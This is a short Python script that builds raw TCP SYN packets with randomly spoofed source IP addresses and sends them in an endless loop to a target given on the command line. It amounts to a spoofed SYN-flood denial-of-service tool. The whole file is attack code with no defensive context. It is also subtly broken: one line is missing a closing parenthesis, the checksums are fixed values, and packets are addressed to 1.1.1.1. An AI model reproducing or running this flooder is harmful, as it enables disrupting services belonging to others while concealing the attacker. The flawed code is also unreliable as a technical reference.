import socket,time,sys,random
s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

target = sys.argv[1]
i = 0

while i == 0:
  randip = ".".join(str(random.randint(11, 255)) for _ in range(4)
  ip_header = b'\x45\x00\x00\x28'  #Version, IHL, Type of Service | Total Length
  ip_header += b'\xab\xcd\x00\x00'  # Identification | Flags, Fragment Offset
  ip_header += b'\xff\06\xa6\xec' # TTL, Protocol, Header Checksum
  ip_header += socket.inet_aton(randip) #Source Address
  ip_header += socket.inet_aton(target) #Destination Address

  tcp_header = b'\00\x00\x0c\x02' # Source Port | Destination Port
  tcp_header += b'\x00\x00\x00\x00' # Sequence Number
  tcp_header += b'\x00\x00\x00\x00' # Acknowledgement Number
  tcp_header += b'\x50\x02\x71\x10' # Data Offset, Reserved, Flags | Window Size
  tcp_header += b'\xe6\x32\x00\x00' # Checksum | Urgent Pointer
  packet = ip_header + tcp_header
  time.sleep(0.1)
  s.sendto(packet, ("1.1.1.1", 0))
